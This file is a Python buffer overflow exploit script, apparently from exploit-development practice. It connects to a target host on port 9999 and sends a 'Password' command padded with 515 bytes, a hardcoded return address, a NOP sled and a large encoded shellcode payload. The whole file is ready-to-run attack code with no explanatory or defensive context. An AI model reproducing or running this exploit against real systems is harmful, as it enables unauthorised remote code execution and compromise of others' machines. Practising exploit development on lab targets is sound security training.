import socket,sys

address = sys.argv[1]
port=9999

#we have brekpoint 600
#value = input("Enter the buffer Value : ")

buffer= 'A'* 515
eip = '\xf3\x12\x17\x31'
nops='\x90' * 10
shellcode= ("\xb8\x27\x64\x71\xe3\xdb\xd7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x42\x0e\x03\x65\x6a\x93\x16\x95\x9a\xd1"
"\xd9\x65\x5b\xb6\x50\x80\x6a\xf6\x07\xc1\xdd\xc6\x4c\x87\xd1"
"\xad\x01\x33\x61\xc3\x8d\x34\xc2\x6e\xe8\x7b\xd3\xc3\xc8\x1a"
"\x57\x1e\x1d\xfc\x66\xd1\x50\xfd\xaf\x0c\x98\xaf\x78\x5a\x0f"
"\x5f\x0c\x16\x8c\xd4\x5e\xb6\x94\x09\x16\xb9\xb5\x9c\x2c\xe0"
"\x15\x1f\xe0\x98\x1f\x07\xe5\xa5\xd6\xbc\xdd\x52\xe9\x14\x2c"
"\x9a\x46\x59\x80\x69\x96\x9e\x27\x92\xed\xd6\x5b\x2f\xf6\x2d"
"\x21\xeb\x73\xb5\x81\x78\x23\x11\x33\xac\xb2\xd2\x3f\x19\xb0"
"\xbc\x23\x9c\x15\xb7\x58\x15\x98\x17\xe9\x6d\xbf\xb3\xb1\x36"
"\xde\xe2\x1f\x98\xdf\xf4\xff\x45\x7a\x7f\xed\x92\xf7\x22\x7a"
"\x56\x3a\xdc\x7a\xf0\x4d\xaf\x48\x5f\xe6\x27\xe1\x28\x20\xb0"
"\x06\x03\x94\x2e\xf9\xac\xe5\x67\x3e\xf8\xb5\x1f\x97\x81\x5d"
"\xdf\x18\x54\xf1\x8f\xb6\x07\xb2\x7f\x77\xf8\x5a\x95\x78\x27"
"\x7a\x96\x52\x40\x11\x6d\x35\xaf\x4e\x6d\xc0\x47\x8d\x6d\xce"
"\x45\x18\x8b\xa4\x79\x4d\x04\x51\xe3\xd4\xde\xc0\xec\xc2\x9b"
"\xc3\x67\xe1\x5c\x8d\x8f\x8c\x4e\x7a\x60\xdb\x2c\x2d\x7f\xf1"
"\x58\xb1\x12\x9e\x98\xbc\x0e\x09\xcf\xe9\xe1\x40\x85\x07\x5b"
"\xfb\xbb\xd5\x3d\xc4\x7f\x02\xfe\xcb\x7e\xc7\xba\xef\x90\x11"
"\x42\xb4\xc4\xcd\x15\x62\xb2\xab\xcf\xc4\x6c\x62\xa3\x8e\xf8"
"\xf3\x8f\x10\x7e\xfc\xc5\xe6\x9e\x4d\xb0\xbe\xa1\x62\x54\x37"
"\xda\x9e\xc4\xb8\x31\x1b\xf4\xf2\x1b\x0a\x9d\x5a\xce\x0e\xc0"
"\x5c\x25\x4c\xfd\xde\xcf\x2d\xfa\xff\xba\x28\x46\xb8\x57\x41"
"\xd7\x2d\x57\xf6\xd8\x67")


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((address,port))
s.send('Password ' + buffer + eip + nops + shellcode )

s.close()
